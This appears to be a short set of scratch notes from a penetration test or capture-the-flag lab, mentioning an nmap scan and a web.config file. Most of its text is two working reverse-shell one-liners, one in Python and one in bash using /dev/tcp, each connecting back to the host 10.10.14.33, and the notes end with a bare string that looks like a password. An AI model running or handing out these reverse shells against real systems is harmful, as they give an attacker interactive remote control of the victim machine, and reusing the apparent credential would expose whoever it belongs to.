start with nmap

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.33",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

web.config is present

bash -i >& /dev/tcp/10.10.14.33/8080 0>&1

CQHEy@9M*m23gBVj